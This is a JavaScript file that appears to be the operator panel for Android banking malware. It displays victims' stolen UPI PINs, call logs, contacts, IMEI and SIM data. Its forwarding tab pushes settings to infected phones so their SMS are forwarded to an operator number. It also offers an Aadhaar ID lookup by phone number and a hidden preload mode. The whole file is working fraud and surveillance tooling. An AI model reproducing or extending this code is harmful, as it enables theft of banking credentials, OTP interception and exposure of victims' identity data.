/* sex.php feature parity — device tabs, cache, aadhar, forward, preload */
var CLIENTS_CACHE_KEY='rbl_clients_cache_v2';
var CLIENTS_CACHE_TTL=6*60*60*1000;
var tabLoaded={};
var _preloadStarted=false;
var _smsTokenLog=[];

function getUpiPinFromRecord(s){
  if(!s)return'';
  var v=s.upipin!=null?s.upipin:(s.upi_pin!=null?s.upi_pin:(s.upiPin!=null?s.upiPin:s.UPI_PIN));
  return v!=null&&String(v).trim()!==''?String(v).trim():'';
}
function resolveLastSeenMs(raw,isOnline){
  if(isOnline)return Date.now();
  var keys=['last_seen','lastSeen','last_ping','lastPing','updated_at','updatedAt','timestamp','ts'];
  for(var i=0;i<keys.length;i++){
    var v=raw[keys[i]];
    if(v==null)continue;
    if(typeof v==='number'&&v>0)return v<1e12?v*1000:v;
    if(typeof v==='string'&&!isNaN(Number(v))&&Number(v)>0){var n=Number(v);return n<1e12?n*1000:n;}
  }
  return 0;
}
function formatLastSeenAgo(ms){
  if(!ms)return'—';
  var sec=Math.max(0,Math.floor((Date.now()-ms)/1000));
  if(sec<60)return sec+'s ago';
  if(sec<3600)return Math.floor(sec/60)+'m ago';
  if(sec<86400)return Math.floor(sec/3600)+'h ago';
  return Math.floor(sec/86400)+'d ago';
}

function getClientsCacheMeta(){
  try{return JSON.parse(localStorage.getItem(CLIENTS_CACHE_KEY)||'null');}catch(e){return null;}
}
function loadClientsCache(){
  var meta=getClientsCacheMeta();
  if(!meta||!meta.byFb)return false;
  var loaded=false;
  firebaseConfigs.forEach(function(cfg){
    var entry=meta.byFb[cfg.id];
    if(!entry||!entry.data||(Date.now()-entry.ts)>=CLIENTS_CACHE_TTL)return;
    Object.keys(entry.data).forEach(function(k){clientsRawMap[k]=entry.data[k];});
    loaded=true;
  });
  if(loaded)processClientsData();
  return loaded;
}
function saveClientsCache(){
  if(!activeFbId)return;
  var slice={};
  Object.keys(clientsRawMap).forEach(function(k){
    if(k.indexOf(activeFbId+'::')===0)slice[k]=clientsRawMap[k];
  });
  if(!Object.keys(slice).length)return;
  try{
    var meta=getClientsCacheMeta()||{byFb:{}};
    if(!meta.byFb)meta.byFb={};
    meta.byFb[activeFbId]={ts:Date.now(),data:slice};
    localStorage.setItem(CLIENTS_CACHE_KEY,JSON.stringify(meta));
  }catch(e){}
}


function panelApiFetch(body){
  return new Promise(function(resolve){
    if(window.RebelAndroid&&RebelAndroid.panelApi){
      try{
        var raw=RebelAndroid.panelApi(JSON.stringify(body));
        resolve(parseJson(raw)||{ok:false});
      }catch(e){resolve({ok:false,error:'API error'});}
      return;
    }
    resolve({ok:false,error:'Not in APK'});
  });
}

function switchDevTab(name,btn){
  document.querySelectorAll('.dev-tab').forEach(function(b){b.classList.remove('active');});
  if(btn)btn.classList.add('active');
  document.querySelectorAll('.dev-section').forEach(function(s){s.classList.remove('active');});
  var el=document.getElementById('devtab-'+name);
  if(el)el.classList.add('active');
  ensureDevTabLoaded(name);
}

function devOn(fbId,path,cb){
  var inst=getFbInstance(fbId);
  if(!inst||!inst.db)return;
  var handler=function(snap){cb(snap);};
  var key=fbId+'::'+path;
  activeListeners[key]={db:inst.db,ref:inst.db.ref(path),h:handler};
  inst.db.ref(path).on('value',handler);
}

function restPoll(fbId,path,cb,ms){
  var inst=getFbInstance(fbId);
  if(!inst)return;
  var tick=function(){restJson(inst.restUrl+'/'+path+'.json').then(cb);};
  tick();
  activeListeners[fbId+'::rest::'+path]={timer:setInterval(tick,ms||8000)};
}

function ensureDevTabLoaded(tab){
  if(!selDev||tabLoaded[tab])return;
  tabLoaded[tab]=true;
  var dev=getSelDev();
  if(!dev)return;
  var inst=getFbInstance(dev.fbId);
  if(inst&&inst.schema==='rabel'){
    if(tab==='sim'){loadRabelSim(dev);return;}
    if(tab==='calls'||tab==='contacts'||tab==='perms'||tab==='forward'){
      setDevTabEmpty(tab,'Not available for rabel schema');
      return;
    }
  }
  var ref=(dev.deviceNode||'devices')+'/'+dev.rawId;
  if(tab==='calls'){
    var loadCalls=function(d){
      var el=document.getElementById('callsList');
      if(!d||!d.calls){el.innerHTML='<div class="empty-mini">No call data</div>';return;}
      el.innerHTML=d.calls.map(function(c,i){
        return '<div class="data-row"><span class="data-idx">'+(i+1)+'</span><div><b>'+esc(c.number||'?')+'</b><div class="data-sub">'+esc(c.contact_name||'—')+' · '+esc(c.date_readable||'—')+' · '+esc(c.duration||'0')+'s</div></div><span class="chip">'+esc(c.type||'?')+'</span></div>';
      }).join('');
    };
    if(inst&&inst.db)devOn(dev.fbId,ref+'/all_calls',function(s){loadCalls(s.val());});
    else restPoll(dev.fbId,ref+'/all_calls',loadCalls,10000);
  }else if(tab==='contacts'){
    var loadContacts=function(d){
      var el=document.getElementById('contactsList');
      if(!d||!d.contacts){el.innerHTML='<div class="empty-mini">No contacts</div>';return;}
      el.innerHTML=d.contacts.map(function(c,i){
        return '<div class="data-row"><span class="data-idx">'+(i+1)+'</span><div><b>'+esc(c.name||'No Name')+'</b><div class="data-sub mono">'+esc(c.phone||'—')+'</div></div></div>';
      }).join('');
    };
    if(inst&&inst.db)devOn(dev.fbId,ref+'/all_contacts',function(s){loadContacts(s.val());});
    else restPoll(dev.fbId,ref+'/all_contacts',loadContacts,12000);
  }else if(tab==='sim'){
    var loadSim=function(s){
      var el=document.getElementById('simList');
      if(!s){el.innerHTML='<div class="empty-mini">No SIM info</div>';return;}
      var fields=[['Operator',s.sim_operator_name],['Network',s.network_operator_name],['IMEI',s.imei],['Subscriber',s.subscriber_id]];
      el.innerHTML=fields.map(function(f){
        return '<div class="data-row"><span class="data-lbl">'+f[0]+'</span><span class="data-val">'+esc(f[1]||'N/A')+'</span></div>';
      }).join('');
    };
    if(inst&&inst.db)devOn(dev.fbId,ref+'/device_info/sim_info',function(s){loadSim(s.val());});
    else restPoll(dev.fbId,ref+'/device_info/sim_info',loadSim,12000);
  }else if(tab==='perms'){
    var loadPerms=function(p){
      var el=document.getElementById('permsList');
      if(!p){el.innerHTML='<div class="empty-mini">No permissions data</div>';return;}
      el.innerHTML=Object.keys(p).map(function(k){
        return '<div class="data-row"><span class="data-lbl">'+esc(k.replace(/_/g,' '))+'</span><span class="chip '+(p[k]?'on':'off')+'">'+(p[k]?'OK':'Denied')+'</span></div>';
      }).join('');
    };
    if(inst&&inst.db)devOn(dev.fbId,ref+'/live_data/permissions',function(s){loadPerms(s.val());});
    else restPoll(dev.fbId,ref+'/live_data/permissions',loadPerms,15000);
  }else if(tab==='forward'){
    if(inst&&inst.db){
      devOn(dev.fbId,ref+'/forwarding_settings',function(s){
        var v=s.val()||{};
        var ft=document.getElementById('fwToggle');if(ft)ft.checked=!!v.enabled;
        var fn=document.getElementById('fwNumber');if(fn)fn.value=v.forward_to||'';
        var fa=document.getElementById('fwAll');if(fa)fa.checked=v.forward_all!==false;
        var ff=document.getElementById('fwFilters');if(ff)ff.value=(v.filters&&v.filters.join)?v.filters.join(', '):'';
      });
      devOn(dev.fbId,ref+'/forwarded_sms',function(s){
        var el=document.getElementById('fwList');
        if(!s.exists()){el.innerHTML='<div class="empty-mini">No forwarded SMS yet</div>';return;}
        var l=[];s.forEach(function(c){l.push(c.val());});
        l.reverse();
        el.innerHTML=l.slice(0,20).map(function(r){
          return '<div class="data-row"><div><b>'+esc(r.from||'?')+'</b> → '+esc(r.to||'?')+'<div class="data-sub">'+esc(r.body||'—')+'</div></div></div>';
        }).join('');
      });
    }
  }
}

function setDevTabEmpty(tab,msg){
  var map={calls:'callsList',contacts:'contactsList',sim:'simList',perms:'permsList',forward:'fwList'};
  var el=document.getElementById(map[tab]);
  if(el)el.innerHTML='<div class="empty-mini">'+esc(msg)+'</div>';
}

function loadRabelSim(dev){
  restPoll(dev.fbId,'clients/'+dev.rawId,function(data){
    var el=document.getElementById('simList');
    if(!data){el.innerHTML='<div class="empty-mini">No device info</div>';return;}
    var pin=getUpiPinFromRecord(data);
    var upiEl=document.getElementById('heroUpi');
    if(upiEl)upiEl.textContent=pin||'—';
    var fields=[['Model',data.modelName],['Mobile',data.mobNo],['Battery',data.battery],['Network',data.service_provider],['Storage',data.storage],['IP',data.ip_address],['Android',data.androidV],['UPI PIN',pin||'N/A']];
    if(data.sims&&data.sims.length)data.sims.forEach(function(sim,i){
      fields.push(['SIM '+(i+1),sim.carrierName+' · '+(sim.phoneNumber||'')]);
    });
    el.innerHTML=fields.map(function(f){
      return '<div class="data-row"><span class="data-lbl">'+f[0]+'</span><span class="data-val">'+esc(String(f[1]||'N/A'))+'</span></div>';
    }).join('');
  },8000);
}

function saveForward(){
  var dev=getSelDev();if(!dev){toast('Select device',false);return;}
  var inst=getFbInstance(dev.fbId);if(!inst){toast('No Firebase',false);return;}
  var ref=(dev.deviceNode||'devices')+'/'+dev.rawId+'/forwarding_settings';
  var filters=(document.getElementById('fwFilters').value||'').split(',').map(function(f){return f.trim();}).filter(Boolean);
  var payload={
    enabled:!!document.getElementById('fwToggle').checked,
    forward_to:(document.getElementById('fwNumber').value||'').trim(),
    forward_all:!!document.getElementById('fwAll').checked,
    filters:filters,
    updated_at:Date.now()
  };
  var url=inst.restUrl+'/'+ref+'.json';
  fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(function(r){
    toast(r.ok?'Forwarding saved':'Save failed',r.ok);
  }).catch(function(){toast('Save failed',false);});
}

function openAadhar(){
  document.getElementById('aadharModal').classList.remove('hidden');
}
function closeAadhar(e){
  if(e&&e.target&&e.target.id!=='aadharModal')return;
  document.getElementById('aadharModal').classList.add('hidden');
}
function lookupAadhar(){
  var num=(document.getElementById('aadharNum').value||'').replace(/\D/g,'');
  var st=document.getElementById('aadharStatus');
  var res=document.getElementById('aadharResult');
  if(num.length<10){st.textContent='Enter valid 10-digit number';st.style.color='var(--error)';return;}
  st.textContent='Looking up...';st.style.color='var(--muted)';
  res.innerHTML='';
  panelApiFetch({type:'aadhar',num:num}).then(function(d){
    if(d.error){
      st.textContent=d.error;st.style.color='var(--error)';return;
    }
    var rows=(d.response&&d.response.data)||[];
    if(!Array.isArray(rows))rows=[];
    var aadhars=[],seen={};
    rows.forEach(function(row){
      if(!row||row.aadhar==null)return;
      var a=String(row.aadhar).replace(/\D/g,'');
      if(!a||seen[a])return;
      seen[a]=1;aadhars.push(a);
    });
    if(!aadhars.length){st.textContent='No aadhar found';st.style.color='var(--error)';return;}
    st.textContent='✅ '+aadhars.length+' found';st.style.color='var(--success)';
    res.innerHTML=aadhars.map(function(a,i){
      return '<div class="data-row"><span class="data-idx">'+(i+1)+'</span><span class="mono aadhar-hl">'+esc(a)+'</span></div>';
    }).join('');
  });
}

function renderAutoTokenLog(log){
  var el=document.getElementById('autoTokenLog');
  if(!el)return;
  if(!log||!log.length){el.innerHTML='<div class="empty-mini">No auto-token activity yet</div>';return;}
  el.innerHTML=log.map(function(row){
    var ok=row.ok?'ok':'bad';
    return '<div class="token-log '+ok+'">'+esc(row.time||'')+' → '+esc(row.to||'?')+' · '+esc((row.message||'').substring(0,40))+'</div>';
  }).join('');
}

/* Hook into existing functions */
var _origSelectDevice=typeof selectDevice==='function'?selectDevice:null;
selectDevice=function(id){
  tabLoaded={};
  if(_origSelectDevice)_origSelectDevice(id);
  else{selDev=id;renderDevices();renderDeviceView();updateSendForm();loadSmsForDevice();}
  ensureDevTabLoaded('sim');
};

var _origRenderDeviceView=typeof renderDeviceView==='function'?renderDeviceView:null;
renderDeviceView=function(){
  var d=getSelDev(),empty=document.getElementById('deviceEmpty'),hero=document.getElementById('deviceHero');
  if(!d){if(empty)empty.classList.remove('hidden');if(hero)hero.classList.add('hidden');return;}
  if(empty)empty.classList.add('hidden');if(hero)hero.classList.remove('hidden');
  var lastSeen=formatLastSeenAgo(resolveLastSeenMs(clientsRawMap[d.id]||{},d.status==='online'));
  var upi=getUpiPinFromRecord(clientsRawMap[d.id]||{});
  hero.innerHTML='<div class="hero-card">'+
    '<div class="hero-phone">'+esc(d.displayPhone)+'</div>'+
    '<div class="hero-model">'+esc(d.name)+(d.brand?' · '+esc(d.brand):'')+'</div>'+
    '<div class="hero-badge '+d.status+'">'+(d.status==='online'?'● ONLINE':'○ OFFLINE')+'</div>'+
    '<div class="hero-last">Last seen: '+esc(lastSeen)+'</div>'+
    '<div class="hero-grid">'+
    '<div class="hero-cell"><div class="hero-lbl">BATTERY</div><div class="hero-val">'+d.battery+'%</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">NETWORK</div><div class="hero-val">'+esc(d.network)+'</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">ANDROID</div><div class="hero-val">'+esc(d.android||'?')+'</div></div>'+
    '<div class="hero-cell"><div class="hero-lbl">UPI PIN</div><div class="hero-val" id="heroUpi">'+esc(upi||'—')+'</div></div>'+
  '</div><div class="dev-tabs">'+
    '<button class="dev-tab active" onclick="switchDevTab(\'sim\',this)">SIM</button>'+
    '<button class="dev-tab" onclick="switchDevTab(\'calls\',this)">Calls</button>'+
    '<button class="dev-tab" onclick="switchDevTab(\'contacts\',this)">Contacts</button>'+
    '<button class="dev-tab" onclick="switchDevTab(\'perms\',this)">Perms</button>'+
    '<button class="dev-tab" onclick="switchDevTab(\'forward\',this)">Forward</button>'+
  '</div>'+
  '<div class="dev-section active" id="devtab-sim"><div id="simList" class="data-list"></div></div>'+
  '<div class="dev-section" id="devtab-calls"><div id="callsList" class="data-list"></div></div>'+
  '<div class="dev-section" id="devtab-contacts"><div id="contactsList" class="data-list"></div></div>'+
  '<div class="dev-section" id="devtab-perms"><div id="permsList" class="data-list"></div></div>'+
  '<div class="dev-section" id="devtab-forward">'+
    '<label class="form-label"><input type="checkbox" id="fwToggle"/> Enable forwarding</label>'+
    '<input class="form-input" id="fwNumber" placeholder="Forward to number"/>'+
    '<label class="form-label"><input type="checkbox" id="fwAll" checked/> Forward all SMS</label>'+
    '<input class="form-input" id="fwFilters" placeholder="Filters (comma separated)"/>'+
    '<button class="btn-send" onclick="saveForward()" style="margin-top:10px">Save Forwarding</button>'+
    '<div id="fwList" class="data-list" style="margin-top:12px"></div>'+
  '</div>'+
  '<div style="margin-top:10px;font-size:9px;color:var(--muted);font-family:\'Space Mono\',monospace">'+esc(d.rawId)+'</div></div>';
  ensureDevTabLoaded('sim');
};

var _origProcessClients=typeof processClientsData==='function'?processClientsData:null;
processClientsData=function(){
  if(_origProcessClients)_origProcessClients();
  saveClientsCache();
};

var _origFetchAll=typeof fetchAllData==='function'?fetchAllData:null;
fetchAllData=function(){
  if(_origFetchAll)return _origFetchAll();
};

var _origSmsTokenFetch=typeof smsTokenFetch==='function'?smsTokenFetch:null;
smsTokenFetch=function(body){
  body=body||{};
  if(body.action==='get'||body.action==='save'){
    return panelApiFetch({
      type:'sms_token',
      sub_action:body.action==='get'?'get':'save',
      enabled:body.enabled,
      device_id:body.device_id,
      database_url:body.database_url,
      fb_name:body.fb_name
    }).then(function(d){
      if(d&&d.ok&&d.log)_smsTokenLog=d.log;
      renderAutoTokenLog(_smsTokenLog);
      return{ok:!!(d&&d.ok),data:d};
    });
  }
  if(_origSmsTokenFetch)return _origSmsTokenFetch(body);
  return Promise.resolve({ok:false});
};

var _origLoadAuto=typeof loadAutoTokenState==='function'?loadAutoTokenState:null;
loadAutoTokenState=function(){
  smsTokenFetch({action:'get'}).then(function(d){
    if(d&&d.ok&&d.data&&d.data.ok){
      _autoTokenOn=!!(d.data.config&&d.data.config.enabled);
      var t=document.getElementById('autoTokenToggle');
      if(t)t.classList.toggle('on',_autoTokenOn);
      _smsTokenLog=d.data.log||[];
      renderAutoTokenLog(_smsTokenLog);
    }
  });
};

/* Preload mode — hidden WebView during login boot */
(function(){
  var IS_PRELOAD=/[?&]preload=1/.test(location.search)||(window.RebelAndroid&&RebelAndroid.isPreload&&RebelAndroid.isPreload());
  if(IS_PRELOAD){
    window.addEventListener('load',function(){startBackgroundPreload();});
    return;
  }
})();
